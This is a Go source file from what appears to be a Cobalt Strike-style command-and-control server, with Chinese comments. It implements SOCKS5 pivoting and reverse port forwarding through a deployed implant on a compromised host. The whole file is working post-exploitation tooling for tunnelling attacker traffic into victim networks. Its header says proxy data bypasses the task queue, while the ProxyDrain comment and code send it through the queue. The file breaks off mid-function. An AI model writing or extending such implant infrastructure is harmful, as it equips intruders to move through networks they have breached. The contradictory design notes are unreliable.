// csdev :: proxy.go  --  服务端 SOCKS5 代理入口 + 反向端口转发 (rportfwd)
//
// 对标 Cobalt Strike 的 socks / rportfwd。实现 docs/protocol_v2.md 的:
//
//	0x0B CMD_PROXY    arg = [4B chan_id][1B op][op 相关]
//	                     op 1 = open  其后 [2B host_len][host][2B port]   (网络序)
//	                     op 2 = data  其后 [payload]: 注入植入体侧 socket
//	                     op 3 = close
//	0x13 CMD_RPORTFWD arg = [1B op][2B bind][2B target]   op 1=start / 0=stop
//	0x1004 T_PROXY_DATA (上行) data = [4B chan_id][bytes]
//	0x2003 T_PROXY_DOWN (下行) data = [4B chan_id][bytes]
//
// 通道号分配约定 (两侧必须一致, 否则 chan_id 会碰撞):
//
//	服务端发起 (SOCKS 入站连接) : 0x0001 .. 0x3FFF   (bit15 = 0)
//	植入体发起 (rportfwd 入站)  : 0x8000 .. 0xBFFF   (bit15 = 1)
//
// 接线 (宿主负责, 本文件不修改既有文件):
//
//  1. REST 路由     : RegisterProxyRoutes(mux)
//  2. 上行 TLV 分发 : v2HandleUpload 的 switch 内
//     case tlvProxyData: ProxyHandleUpstream(sess, t.Type, t.Data)
//  3. 下行数据泵    : v2HandleUpload 中 sess.takeQueue() 之前调用 ProxyDrain(sess)
//  4. open 回执关联 : v2HandleResult 里 ProxyResult(sess, r.TaskID, len(r.Out) > 0)
//
// 三个关键设计决策 (都不是随意选的):
//
//  1. 数据面不走任务队列。若每个数据包都 enqueue 成 CMD_PROXY 任务, 单轮能带的
//     数据受宿主任务队列条数限制 (beacon2.c 的 PEND_MAX 是个位数), 吞吐只有
//     几 KB/轮。数据改为在 ProxyDrain 里内联塞进本次应答帧 (0x2003 单帧可到 MB 级),
//     任务队列只承载 open / close 等低频控制面动作。
//
//  2. SOCKS 在第 4 步 (植入体 open 回执) 之后才回 success。open 回执经
//     ProxyResult 关联: 植入体 open 成功时会带回非空描述文本, 失败时带回
//     "[-] ..." 同样非空 —— 所以判定依据是"是否收到回执", 而不是回执内容。
//     连不上目标时不会给客户端假成功。
//
//  3. 域名的 DNS 解析放在服务端。植入体侧 gethostbyname 会不可控阻塞, 直接卡死
//     beacon 主循环, 因此 over-the-wire 的 host 字段一律是 IPv4 字面量。
package main

import (
	"bufio"
	"bytes"
	"encoding/binary"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// ---------------------------------------------------------------- 常量

const (
	socksVer  byte = 0x05
	socksNoAu byte = 0x00

	socksOK          byte = 0x00
	socksFail        byte = 0x01
	socksNotAllowed  byte = 0x02
	socksHostUnreach byte = 0x04
	socksConnRefused byte = 0x05

	atypIPv4   byte = 0x01
	atypDomain byte = 0x03
	atypIPv6   byte = 0x04

	proxyChanBuf   = 32 * 1024       // 每通道下行缓冲块
	proxyChanHiWa  = 256 * 1024      // 下行高水位: 超过则暂停从客户端读 (背压)
	proxyUpBudget  = 1 * 1024 * 1024 // 单轮下行总量上限 (帧明文上限 1.5MB)
	proxyMaxChan   = 512             // 服务端侧通道数上限
	proxyPumpTick  = 100 * time.Millisecond
	proxyOpenWait  = 20 * time.Second // 等植入体 open 回执的上限
	proxyDialWait  = 10 * time.Second // 反向通道连目标超时
	proxyIdleLife  = 10 * time.Minute // 通道空闲回收
	proxyLocalLo   = 0x8000           // 植入体侧通道区间下界
	proxyLocalHi   = 0xBFFF           // 植入体侧通道区间上界
	proxyTLVMax    = 128 * 1024       // 单条 T_PROXY_DATA 上限 (与植入体侧对齐)
	proxyDataChunk = 56 * 1024        // 单个下行数据任务的载荷上限 (须 <= PEND_ARG_MAX-5)
)

// ---------------------------------------------------------------- 运行时

type proxyChan struct {
	id     uint32
	sid    string
	client net.Conn
	// cr 与 SOCKS 握手共享同一个 bufio.Reader。**必须**用它读, 不能直接读 client:
	// 握手时 bufio 可能已经把 CONNECT 之后的首批数据预读进自己的缓冲,
	// 再读原始 conn 会永远读不到那几个字节 (实测: 客户端请求卡住不发)。
	cr     *bufio.Reader
	buf    []byte // 下行: 客户端(或反向目标) -> 植入体 聚合缓冲, 受 mu 保护
	rx     []byte // pump 专用接收缓冲: 只被 pump goroutine 触碰, 无需加锁
	acked  chan struct{}
	closed bool
	lastA  time.Time // 由 ack / 上行数据刷新
	lastB  time.Time // 由下行数据刷新
}

// 一次 SOCKS 代理运行 (一个 sid + 一个本地端口)
type proxyRun struct {
	sid     string
	port    int
	ln      net.Listener
	reverse bool // true = rportfwd 反向通道的聚合容器 (无监听 socket)

	mu    sync.Mutex
	chans map[uint32]*proxyChan
	stop  chan int

	ntx, nrx       uint64
	upBytes, dnByt uint64
}

type rportfwdRun struct {
	sid    string
	port   int
	target string // 服务端侧回连目标 "host:port"
}

var (
	proxyMu      sync.Mutex
	proxyRuns    = map[string]*proxyRun{} // key: sid:port 或 reverse:sid
	rportfwdRuns = map[string]*rportfwdRun{}
	proxyOpenMap = map[uint32]uint32{} // task_id -> chan_id (等待 open 回执)

	proxyNextID atomic.Uint32

	proxyStatUp  atomic.Uint64
	proxyStatDn  atomic.Uint64
	proxyStatTx  atomic.Uint64
	proxyStatRx  atomic.Uint64
	proxyPumpOne sync.Once
)

// ---------------------------------------------------------------- ID 分配

// proxyRunKey 生成代理入口在运行表中的唯一键
func proxyRunKey(sid string, port int) string {
	return sid + ":" + strconv.Itoa(port)
}

func proxyAllocID() uint32 {
	for i := 0; i < 0x4000; i++ {
		id := proxyNextID.Add(1) & 0x3FFF
		if id == 0 {
			id = 1
		}
		if proxyFindChan(id) == nil {
			return id
		}
	}
	return 0
}

func proxyFindChan(id uint32) *proxyChan {
	proxyMu.Lock()
	runs := make([]*proxyRun, 0, len(proxyRuns))
	for _, r := range proxyRuns {
		runs = append(runs, r)
	}
	proxyMu.Unlock()

	for _, r := range runs {
		r.mu.Lock()
		c := r.chans[id]
		r.mu.Unlock()
		if c != nil {
			return c
		}
	}
	return nil
}

func proxyIsLocalChan(id uint32) bool {
	return id >= proxyLocalLo && id <= proxyLocalHi
}

// ---------------------------------------------------------------- 生命周期

// ProxyStart 在 sid 会话上启动 SOCKS5 代理入口, 监听 127.0.0.1:listenPort。
func ProxyStart(sid string, listenPort int) (string, error) {
	sess := v2st.lookup(sid)
	if sess == nil {
		return "", fmt.Errorf("无此 v2 会话: %s", sid)
	}
	if listenPort <= 0 || listenPort > 65535 {
		return "", fmt.Errorf("端口非法: %d", listenPort)
	}

	key := proxyRunKey(sid, listenPort)
	proxyMu.Lock()
	if proxyRuns[key] != nil {
		proxyMu.Unlock()
		return "", fmt.Errorf("%s 的 SOCKS 端口 %d 已在运行", sid, listenPort)
	}
	proxyMu.Unlock()

	ln, err := net.Listen("tcp", "127.0.0.1:"+strconv.Itoa(listenPort))
	if err != nil {
		return "", fmt.Errorf("监听 127.0.0.1:%d 失败: %v", listenPort, err)
	}

	run := &proxyRun{
		sid:   sid,
		port:  listenPort,
		ln:    ln,
		chans: map[uint32]*proxyChan{},
		stop:  make(chan int, 1),
	}

	proxyMu.Lock()
	proxyRuns[key] = run
	proxyMu.Unlock()

	go proxyAcceptLoop(run)
	proxyPumpStart()

	msg := fmt.Sprintf("SOCKS5 已在 127.0.0.1:%d 监听 (会话 %s)", listenPort, sid)
	logf("[+] %s", msg)
	sess.pushOut("[+] " + msg + "\r\n")
	eventLog("proxy", sid, "SOCKS 启动", "127.0.0.1:"+strconv.Itoa(listenPort))
	bgJobStart(sid, "socks", "SOCKS5 127.0.0.1:"+strconv.Itoa(listenPort), listenPort, true)
	return msg, nil
}

// ProxyStop 关闭指定 (sid, port) 的 SOCKS 入口; 释放全部通道并在 outbox 里
// 追加 close 通知 (植入体会在下一轮取走并释放 fd)。
func ProxyStop(sid string, listenPort int) error {
	key := proxyRunKey(sid, listenPort)
	proxyMu.Lock()
	run := proxyRuns[key]
	if run == nil {
		proxyMu.Unlock()
		return fmt.Errorf("未找到 %s 的 SOCKS 入口 (端口 %d)", sid, listenPort)
	}
	delete(proxyRuns, key)
	proxyMu.Unlock()

	run.closeAll(v2st.lookup(sid))
	logf("[-] SOCKS 入口已停止: %s :%d", sid, listenPort)
	eventLog("operator", sid, "SOCKS 停止", strconv.Itoa(listenPort))
	bgJobEndByKind(sid, "socks", listenPort, "killed", "已停止 SOCKS 监听")
	return nil
}

// closeAll 释放本 run 下所有通道。sess 非 nil 时逐条下发 close 通知。
func (r *proxyRun) closeAll(sess *V2Session) {
	if r.ln != nil {
		select {
		case r.stop <- 1:
		default:
		}
		r.ln.Close()
	}

	r.mu.Lock()
	chans := make([]*proxyChan, 0, len(r.chans))
	for _, c := range r.chans {
		chans = append(chans, c)
	}
	r.chans = map[uint32]*proxyChan{}
	r.mu.Unlock()

	for _, c := range chans {
		proxyCloseChan(c, sess, true)
	}
}

// ---------------------------------------------------------------- accept

func proxyAcceptLoop(r *proxyRun) {
	for {
		conn, err := r.ln.Accept()
		if err != nil {
			return
		}
		go proxyHandleSocks(r, conn)
	}
}

// SOCKS5 握手 (无认证) + CONNECT -> 建通道 -> 等植入体回执 -> 回 success
func proxyHandleSocks(r *proxyRun, conn net.Conn) {
	defer func() {
		if recover() != nil {
			conn.Close()
		}
	}()

	_ = conn.SetDeadline(time.Now().Add(30 * time.Second))
	br := bufio.NewReader(conn)

	// --- 1. 方法协商 ---
	hdr := make([]byte, 2)
	if _, err := io.ReadFull(br, hdr); err != nil || hdr[0] != socksVer {
		conn.Close()
		return
	}
	methods := make([]byte, int(hdr[1]))
	if _, err := io.ReadFull(br, methods); err != nil {
		conn.Close()
		return
	}
	ok := false
	for _, m := range methods {
		if m == socksNoAu {
			ok = true
			break
		}
	}
	if !ok {
		_, _ = conn.Write([]byte{socksVer, 0xFF})
		conn.Close()
		return
	}
	if _, err := conn.Write([]byte{socksVer, socksNoAu}); err != nil {
		conn.Close()
		return
	}

	// --- 2. CONNECT 请求 ---
	req := make([]byte, 4)
	if _, err := io.ReadFull(br, req); err != nil {
		conn.Close()
		return
	}
	if req[0] != socksVer {
		proxySocksReply(conn, socksFail, nil, 0)
		conn.Close()
		return
	}
	if req[1] != 0x01 {
		proxySocksReply(conn, socksNotAllowed, nil, 0)
		conn.Close()
		return
	}

	host, err := proxyReadAddr(br, req[3])
	if err != nil {
		proxySocksReply(conn, socksFail, nil, 0)
		conn.Close()
		return
	}
	pb := make([]byte, 2)
	if _, err := io.ReadFull(br, pb); err != nil {
		conn.Close()
		return
	}
	port := binary.BigEndian.Uint16(pb)

	target, ipv4, terr := proxyResolve(host)
	if terr != nil {
		logf("[!] SOCKS 目标解析失败: %s (%v)", host, terr)
		proxySocksReply(conn, socksHostUnreach, nil, 0)
		conn.Close()
		return
	}
	if ipv4 == nil {
		// 植入体侧只接受 IPv4 字面量
		logf("[!] SOCKS 目标 %s 仅解析出 IPv6, 植入体侧不支持", host)
		proxySocksReply(conn, socksHostUnreach, nil, 0)
		conn.Close()
		return
	}

	// --- 3. 建通道 + 下发 open 任务 ---
	c, err := proxyChanNew(r, conn, br, target, int(port))
	if err != nil {
		logf("[!] %s SOCKS 通道创建失败: %v", r.sid, err)
		proxySocksReply(conn, socksConnRefused, ipv4, port)
		conn.Close()
		return
	}

	// --- 4. 等植入体回执 ---
	select {
	case <-c.acked:
		_ = conn.SetDeadline(time.Time{})
		proxySocksReply(conn, socksOK, ipv4, port)
		logf("[+] %s 通道 %d 已建立 %s:%d", r.sid, c.id, target, port)
	case <-time.After(proxyOpenWait):
		logf("[!] %s 通道 %d 等待植入体 open 回执超时 (%s:%d)", r.sid, c.id, target, port)
		proxyCloseChan(c, v2st.lookup(r.sid), true)
		proxySocksReply(conn, socksHostUnreach, ipv4, port)
		conn.Close()
	}
}

// 域名在服务端解析; 返回字面量、IPv4 表示 (可能为 nil) 与错误
func proxyResolve(host string) (string, net.IP, error) {
	if ip := net.ParseIP(host); ip != nil {
		return ip.String(), ip.To4(), nil
	}
	ips, err := net.LookupIP(host)
	if err != nil {
		return "", nil, err
	}
	if len(ips) == 0 {
		return "", nil, errors.New("无解析结果")
	}
	var v4, first net.IP
	for _, x := range ips {
		if first == nil {
			first = x
		}
		if v := x.To4(); v != nil {
			v4 = v
			break
		}
	}
	if v4 != nil {
		return v4.String(), v4, nil
	}
	return first.String(), nil, nil
}

func proxyReadAddr(br *bufio.Reader, atyp byte) (string, error) {
	switch atyp {
	case atypIPv4:
		b := make([]byte, 4)
		if _, err := io.ReadFull(br, b); err != nil {
			return "", err
		}
		return net.IP(b).String(), nil
	case atypIPv6:
		b := make([]byte, 16)
		if _, err := io.ReadFull(br, b); err != nil {
			return "", err
		}
		return net.IP(b).String(), nil
	case atypDomain:
		l := make([]byte, 1)
		if _, err := io.ReadFull(br, l); err != nil {
			return "", err
		}
		if l[0] == 0 {
			return "", errors.New("空域名")
		}
		b := make([]byte, int(l[0]))
		if _, err := io.ReadFull(br, b); err != nil {
			return "", err
		}
		return string(b), nil
	}
	return "", errors.New("未知 ATYP")
}

// 应答按规范回显 BND.ADDR/PORT; 目标不可达时回 0.0.0.0:0
func proxySocksReply(conn net.Conn, code byte, ip net.IP, port uint16) {
	b := make([]byte, 0, 10)
	b = append(b, socksVer, code, 0x00)
	if v4 := ip.To4(); v4 != nil {
		b = append(b, atypIPv4)
		b = append(b, v4...)
	} else {
		b = append(b, atypIPv4, 0, 0, 0, 0)
	}
	var pb [2]byte
	binary.BigEndian.PutUint16(pb[:], port)
	b = append(b, pb[:]...)
	_, _ = conn.Write(b)
}

// ---------------------------------------------------------------- 通道

func proxyChanNew(r *proxyRun, client net.Conn, br *bufio.Reader, host string, port int) (*proxyChan, error) {
	id := proxyAllocID()
	if id == 0 {
		return nil, errors.New("通道号耗尽")
	}
	if proxyChanTotal() >= proxyMaxChan {
		return nil, fmt.Errorf("通道数已达上限 %d", proxyMaxChan)
	}

	c := &proxyChan{
		id:     id,
		sid:    r.sid,
		client: client,
		cr:     br,
		buf:    make([]byte, 0, proxyChanBuf),
		rx:     make([]byte, proxyChanBuf),
		acked:  make(chan struct{}),
		lastA:  time.Now(),
		lastB:  time.Now(),
	}

	r.mu.Lock()
	r.chans[id] = c
	r.mu.Unlock()

	// 有通道就必须有泵在跑: 泵负责 socket -> buf 这一半通路
	proxyPumpStart()

	taskID := proxyEnqueueOpen(r.sid, id, host, port)
	if taskID == 0 {
		r.mu.Lock()
		delete(r.chans, id)
		r.mu.Unlock()
		return nil, errors.New("会话不存在, 无法下发 open")
	}

	proxyMu.Lock()
	proxyOpenMap[taskID] = id
	proxyMu.Unlock()

	return c, nil
}

func proxyChanTotal() int {
	proxyMu.Lock()
	runs := make([]*proxyRun, 0, len(proxyRuns))
	for _, r := range proxyRuns {
		runs = append(runs, r)
	}
	proxyMu.Unlock()

	n := 0
	for _, r := range runs {
		r.mu.Lock()
		n += len(r.chans)
		r.mu.Unlock()
	}
	return n
}

// 组装 [4B chan_id][1B op=1][2B host_len][host][2B port]; 返回 task_id
func proxyEnqueueOpen(sid string, id uint32, host string, port int) uint32 {
	sess := v2st.lookup(sid)
	if sess == nil {
		return 0
	}
	hb := []byte(host)
	if len(hb) > 255 {
		hb = hb[:255]
	}
	arg := make([]byte, 0, 5+2+len(hb)+2)

	var t4 [4]byte
	binary.BigEndian.PutUint32(t4[:], id)
	arg = append(arg, t4[:]...)
	arg = append(arg, 0x01)

	var t2 [2]byte
	binary.BigEndian.PutUint16(t2[:], uint16(len(hb)))
	arg = append(arg, t2[:]...)
	arg = append(arg, hb...)
	binary.BigEndian.PutUint16(t2[:], uint16(port))
	arg = append(arg, t2[:]...)

	taskID := sess.enqueue(cmdProxy, "socks", arg)
	logf("[>] %s SOCKS open task#%d chan=%d -> %s:%d", sid, taskID, id, host, port)
	return taskID
}

// 组装 [4B chan_id][1B op=3]
func proxyEnqueueClose(sess *V2Session, id uint32) {
	if sess == nil {
		return
	}
	arg := make([]byte, 5)
	binary.BigEndian.PutUint32(arg, id)
	arg[4] = 0x03
	sess.enqueue(cmdProxy, "socks_close", arg)
}

// 由 v2HandleResult 调用: open 任务的回执到了
//
// 判定依据是"收到了回执", 不是回执内容 —— proxy_task 失败时返回的是
// "[-] 连接目标失败或超时" 这类文本, 长度同样非零。
func ProxyResult(sess *V2Session, taskID uint32, out []byte) bool {
	proxyMu.Lock()
	id, hit := proxyOpenMap[taskID]
	if hit {
		delete(proxyOpenMap, taskID)
	}
	proxyMu.Unlock()
	if !hit {
		return false
	}
	c := proxyFindChan(id)
	if c == nil {
		return true
	}
	// 植入体侧失败时回的是 "[-] ..." 文本。记一条明确警告 —— 否则 SOCKS 客户端
	// 会看到 CONNECT 成功, 而数据面永远不动, 排查时极易误判为"接线没做"。
	if bytes.HasPrefix(bytes.TrimSpace(out), []byte("[-]")) {
		logf("[!] %s 通道 %d 建立失败: %s", sess.ID, id, strings.TrimSpace(string(out)))
	}
	select {
	case <-c.acked:
	default:
		close(c.acked)
	}
	return true
}

// 从 outbox 摘除通道: 标记关闭 + 关 socket + 下发 close 通知
func proxyCloseChan(c *proxyChan, sess *V2Session, notify bool) {
	proxyMu.Lock()
	already := c.closed
	c.closed = true
	proxyMu.Unlock()
	if already {
		return
	}

	if c.client != nil {
		_ = c.client.Close()
	}

	proxyMu.Lock()
	runs := make([]*proxyRun, 0, len(proxyRuns))
	for _, r := range proxyRuns {
		runs = append(runs, r)
	}
	proxyMu.Unlock()

	for _, r := range runs {
		r.mu.Lock()
		if r.chans[c.id] == c {
			delete(r.chans, c.id)
		}
		r.mu.Unlock()
	}

	if notify {
		proxyEnqueueClose(sess, c.id)
	}
}

// ---------------------------------------------------------------- 上行

// ProxyHandleUpstream 处理植入体上行的代理 TLV。
// typ == 0x1004 时返回 true (已消费); 其余 type 返回 false, 交给既有分支。
func ProxyHandleUpstream(sess *V2Session, typ uint16, data []byte) bool {
	if typ != tlvProxyData {
		return false
	}
	if sess == nil {
		return true
	}
	proxyHandleUp(sess, data)
	return true
}

func proxyHandleUp(sess *V2Session, d []byte) {
	// 边界校验: [4B chan_id][bytes], 上限与植入体侧 PROXY_TLV_MAX 对齐
	if len(d) < 4 || len(d) > proxyTLVMax {
		return
	}
	id := binary.BigEndian.Uint32(d[0:4])
	payload := d[4:]

	// --- 植入体发起的通道 (rportfwd) ---
	if proxyIsLocalChan(id) {
		if len(payload) == 0 {
			// 空载荷 + 新通道号 = "有入站连接, 服务端请连目标"
			if proxyFindChan(id) == nil {
				go proxyReverseConnect(sess, id)
			} else {
				proxyHandleDown(sess, id, nil, true)
			}
			return
		}
	}

	c := proxyFindChan(id)
	if c == nil {
		// 无法归属的上行数据: 丢弃并告知植入体关闭, 避免 fd 泄漏
		logf("[!] %s 收到未知通道 %d 的上行数据 (%d 字节), 要求释放", sess.ID, id, len(payload))
		proxyEnqueueClose(sess, id)
		return
	}

	if len(payload) == 0 {
		logf("[*] %s 通道 %d 对端关闭", sess.ID, id)
		proxyCloseChan(c, sess, false)
		return
	}
	proxyHandleDown(sess, id, payload, false)
}

// 把上行数据写给通道的本地端 (SOCKS 客户端 / 反向目标连接)
func proxyHandleDown(sess *V2Session, id uint32, payload []byte, closeOnly bool) {
	proxyMu.Lock()
	runs := make([]*proxyRun, 0, len(proxyRuns))
	for _, r := range proxyRuns {
		runs = append(runs, r)
	}
	proxyMu.Unlock()

	for _, r := range runs {
		r.mu.Lock()
		c := r.chans[id]
		if c == nil {
			r.mu.Unlock()
			continue // 注意是 continue: 目标可能落在别的 run 上
		}
		if closeOnly {
			r.mu.Unlock()
			proxyCloseChan(c, sess, false)
			return
		}
		if c.closed {
			r.mu.Unlock()
			return
		}
		_, err := c.client.Write(payload)
		if err == nil {
			c.lastA = time.Now()
			r.dnByt += uint64(len(payload))
			proxyStatDn.Add(uint64(len(payload)))
		}
		r.mu.Unlock()
		if err != nil {
			proxyCloseChan(c, sess, true)
		}
		return
	}
}

// ---------------------------------------------------------------- 反向通道

// 植入体侧 rportfwd 监听口收到入站连接 -> 这里连到后端目标并接驳
func proxyReverseConnect(sess *V2Session, id uint32) {
	target := proxyReverseTarget(sess.ID)
	if target == "" {
		logf("[!] %s 反向通道 %d 无回连目标, 释放", sess.ID, id)
		proxyEnqueueClose(sess, id)
		return
	}
	if _, _, err := net.SplitHostPort(target); err != nil {
		logf("[!] %s 反向通道 %d 目标非法: %s", sess.ID, id, target)
		proxyEnqueueClose(sess, id)
		return
	}

	conn, err := net.DialTimeout("tcp", target, proxyDialWait)
	if err != nil {
		logf("[!] %s 反向通道 %d 连接 %s 失败: %v", sess.ID, id, target, err)
		proxyEnqueueClose(sess, id)
		return
	}

	c := &proxyChan{
		id:     id,
		sid:    sess.ID,
		client: conn,
		buf:    make([]byte, 0, proxyChanBuf),
		rx:     make([]byte, proxyChanBuf),
		acked:  make(chan struct{}),
		lastA:  time.Now(),
		lastB:  time.Now(),
	}
	close(c.acked)

	r := proxyReverseRun(sess.ID)
	r.mu.Lock()
	if _, dup := r.chans[id]; dup {
		r.mu.Unlock()
		conn.Close()
		return
	}
	r.chans[id] = c
	r.mu.Unlock()

	logf("[+] %s 反向通道 %d 已接驳 %s", sess.ID, id, target)
	eventLog("proxy", sess.ID, "反向通道", fmt.Sprintf("chan=%d -> %s", id, target))
}

func proxyReverseTarget(sid string) string {
	proxyMu.Lock()
	defer proxyMu.Unlock()
	for _, rr := range rportfwdRuns {
		if rr.sid == sid && rr.target != "" {
			return rr.target
		}
	}
	return ""
}

// 反向通道没有监听 socket, 用一个按会话维度的伪 run 复用同一套泵与回收逻辑
func proxyReverseRun(sid string) *proxyRun {
	key := "reverse:" + sid
	proxyMu.Lock()
	r := proxyRuns[key]
	if r == nil {
		r = &proxyRun{
			sid:     sid,
			reverse: true,
			chans:   map[uint32]*proxyChan{},
			stop:    make(chan int, 1),
		}
		proxyRuns[key] = r
	}
	proxyMu.Unlock()
	proxyPumpStart()
	return r
}

// ---------------------------------------------------------------- 数据泵

func proxyPumpStart() {
	proxyPumpOne.Do(func() {
		go proxyPumpLoop()
	})
}

// 每 100ms 扫一遍: 本地端 -> 植入体 (聚合到通道 buf), 以及空闲/断开回收
func proxyPumpLoop() {
	ticker := time.NewTicker(proxyPumpTick)
	defer ticker.Stop()

	for range ticker.C {
		now := time.Now()

		proxyMu.Lock()
		runs := make([]*proxyRun, 0, len(proxyRuns))
		for _, r := range proxyRuns {
			runs = append(runs, r)
		}
		proxyMu.Unlock()

		for _, r := range runs {
			r.mu.Lock()
			chans := make([]*proxyChan, 0, len(r.chans))
			for _, c := range r.chans {
				chans = append(chans, c)
			}
			r.mu.Unlock()

			for _, c := range chans {
				if c.client == nil {
					continue
				}
				proxyMu.Lock()
				dead := c.closed
				proxyMu.Unlock()
				if dead {
					continue
				}

				r.mu.Lock()
				buffered := len(c.buf)
				r.mu.Unlock()

				// 下行已积压到高水位: 本轮不读, 靠 TCP 窗口形成背压, 不丢数据
				if buffered < proxyChanHiWa {
					// 读进通道私有的 rx 缓冲 (pump 独占), 再在锁内并入 buf。
					// 绝不能直接读进 buf 的尾部空间 —— buf 会被 ProxyDrain 在锁内
					// 替换成新切片, len 可能在读取期间归零, 导致零长 Read 立即
					// 返回 EOF, 把活连接误判成断开。
					_ = c.client.SetReadDeadline(now.Add(50 * time.Millisecond))
					rd := io.Reader(c.client)
					if c.cr != nil {
						rd = c.cr // 用握手共享的 bufio: 它可能已预读客户端数据
					}
					n, err := rd.Read(c.rx)
					if n > 0 {
						r.mu.Lock()
						c.buf = append(c.buf, c.rx[:n]...)
						c.lastB = now
						r.nrx += uint64(n)
						r.mu.Unlock()
						proxyStatRx.Add(uint64(n))
					}
					if err != nil && !proxyIsTimeout(err) {
						proxyCloseChan(c, v2st.lookup(r.sid), true)
						continue
					}
				}

				if now.Sub(c.lastA) > proxyIdleLife && now.Sub(c.lastB) > proxyIdleLife {
					logf("[*] %s 通道 %d 空闲超时, 回收", r.sid, c.id)
					proxyCloseChan(c, v2st.lookup(r.sid), true)
				}
			}
		}
	}
}

func proxyIsTimeout(err error) bool {
	// io.ErrUnexpectedEOF 不是超时: 半关闭场景会返回它, 必须按断开处理
	if errors.Is(err, io.ErrUnexpectedEOF) {
		return false
	}
	var ne net.Error
	if errors.As(err, &ne) {
		return ne.Timeout()
	}
	return false
}

// ProxyDrain 把各通道待发的下行数据作为 CMD_PROXY(data) 任务塞进会话队列。
// 由宿主在 v2ProcessFrame 中 sess.takeQueue() 之前调用 (见交付说明接线片段)。
//
// 为什么走任务队列而不是内联追加 TLV —— 这是被植入体的解析方式逼出来的:
// beacon2.c 主循环对下行明文直接调 cs_batch_count / cs_batch_task, 二者把明文的
// **首字段**当作 TASK_BATCH 头解析 (kits/proto/frame.c:224 / :230)。因此下行明文
// 的第一个字节必须就是批次头, 不能前置任何 TLV; 而把 T_PROXY_DOWN 追加在批次
// 之后同样不行 —— cs_batch_task 按 [4B count] 逐条推进, 越界即返回 0, 数据会被
// 解析成畸形任务甚至污染 batchlen 判断。结论: 代理下行数据只能以
// CMD_PROXY(0x0B, op=2) 任务形式下发。
//
// 吞吐依赖: 单个数据任务的 arg 要完整送达植入体, 宿主的 PEND_ARG_MAX 必须 >=
// proxyDataChunk+5。默认 PEND_ARG_MAX=1024 会把块截断 —— 交付说明给出了需要
// 调整的宏 (PEND_ARG_MAX=65536, PEND_MAX=16)。
//
// 返回值: 本次入队的数据任务数 (0 表示无待发数据)。
func ProxyDrain(sess *V2Session) int {
	if sess == nil {
		return 0
	}

	proxyMu.Lock()
	runSnap := make([]*proxyRun, 0, len(proxyRuns))
	for _, r := range proxyRuns {
		if r.sid == sess.ID {
			runSnap = append(runSnap, r)
		}
	}
	proxyMu.Unlock()
	if len(runSnap) == 0 {
		return 0
	}

	budget := proxyUpBudget
	sent := 0

	for _, r := range runSnap {
		r.mu.Lock()
		chanSnap := make([]*proxyChan, 0, len(r.chans))
		for _, x := range r.chans {
			chanSnap = append(chanSnap, x)
		}
		r.mu.Unlock()

		// 本通道的待发数据可能超过单块上限, 这里持续切块直到取空或超预算。
		// 用显式循环索引而非循环内跳转, 避免 continue 落到内层块里的歧义。
		for ci := 0; ci < len(chanSnap); ci++ {
			for {
				if budget < 16 {
					return sent
				}
				x := chanSnap[ci]

				r.mu.Lock()
				avail := len(x.buf)
				if x.closed || avail == 0 {
					r.mu.Unlock()
					break // 本通道无数据: 换下一个通道
				}
				take := avail
				if take > proxyDataChunk {
					take = proxyDataChunk
				}
				if take > budget-6 {
					take = budget - 6
				}
				if take <= 0 {
					r.mu.Unlock()
					return sent
				}

				payload := make([]byte, take)
				copy(payload, x.buf[:take])

				if take == avail {
					x.buf = make([]byte, 0, proxyChanBuf)
				} else {
					x.buf = x.buf[take:]
				}
				x.lastB = time.Now()
				r.ntx++
				r.upBytes += uint64(take)
				r.mu.Unlock()

				// arg = [4B chan_id][1B op=2][bytes]
				arg := make([]byte, 5+len(payload))
				binary.BigEndian.PutUint32(arg[0:], x.id)
				arg[4] = 0x02
				copy(arg[5:], payload)

				sess.enqueue(cmdProxy, "socks_data", arg)
				budget -= 5 + len(arg)
				sent++
			}
		}
	}

	if sent > 0 {
		logf("[>] %s 代理下行 %d 个数据任务 (%d 字节)", sess.ID, sent, 5+proxyUpBudget-budget)
	}
	return sent
}

// ---------------------------------------------------------------- rportfwd

// RPortfwdStart 让植入体在 bindPort 上监听 (CMD_RPORTFWD op=1),
// 并登记服务端侧的回连目标 target ("host:port")。
func RPortfwdStart(sid string, bindPort int, target string) (string, error) {
	sess := v2st.lookup(sid)
	if sess == nil {
		return "", fmt.Errorf("无此 v2 会话: %s", sid)
	}
	if bindPort <= 0 || bindPort > 65535 {
		return "", fmt.Errorf("端口非法: %d", bindPort)
	}
	if target != "" {
		if _, _, err := net.SplitHostPort(target); err != nil {
			return "", fmt.Errorf("目标格式应为 host:port, 收到 %q", target)
		}
	}

	arg := make([]byte, 5)
	arg[0] = 1
	binary.BigEndian.PutUint16(arg[1:], uint16(bindPort))
	// 协议 0x13 的 [2B target] 只有端口位宽, 无法表达"回连到哪台主机",
	// 因此真正的回连目标由本 API 的 target 参数决定 (见 proxyReverseConnect)。
	tp := 0
	if target != "" {
		if _, ps, err := net.SplitHostPort(target); err == nil {
			tp, _ = strconv.Atoi(ps)
		}
	}
	binary.BigEndian.PutUint16(arg[3:], uint16(tp))

	taskID := sess.enqueue(cmdRPortfwd, "rportfwd", arg)

	proxyMu.Lock()
	rportfwdRuns[proxyRunKey(sid, bindPort)] = &rportfwdRun{sid: sid, port: bindPort, target: target}
	proxyMu.Unlock()

	msg := fmt.Sprintf("反向转发已下发: %s 监听 0.0.0.0:%d, 服务端回连目标 %s (task#%d)",
		sid, bindPort, orNone(target), taskID)
	logf("[>] %s", msg)
	sess.pushOut("[*] " + msg + "\r\n")
	eventLog("proxy", sid, "rportfwd 启动", fmt.Sprintf("%d -> %s", bindPort, orNone(target)))
	bgJobStart(sid, "rportfwd", fmt.Sprintf("反向转发 :%d -> %s", bindPort, orNone(target)), bindPort, true)
	return msg, nil
}

// RPortfwdStop 停止植入体侧的监听
func RPortfwdStop(sid string, bindPort int) error {
	sess := v2st.lookup(sid)
	if sess == nil {
		return fmt.Errorf("无此 v2 会话: %s", sid)
	}

	arg := make([]byte, 5)
	arg[0] = 0
	binary.BigEndian.PutUint16(arg[1:], uint16(bindPort))
	binary.BigEndian.PutUint16(arg[3:], 0)

	sess.enqueue(cmdRPortfwd, "rportfwd_stop", arg)

	proxyMu.Lock()
	delete(rportfwdRuns, proxyRunKey(sid, bindPort))
	proxyMu.Unlock()

	logf("[-] %s 反向转发已停止: %d", sid, bindPort)
	eventLog("operator", sid, "rportfwd 停止", strconv.Itoa(bindPort))
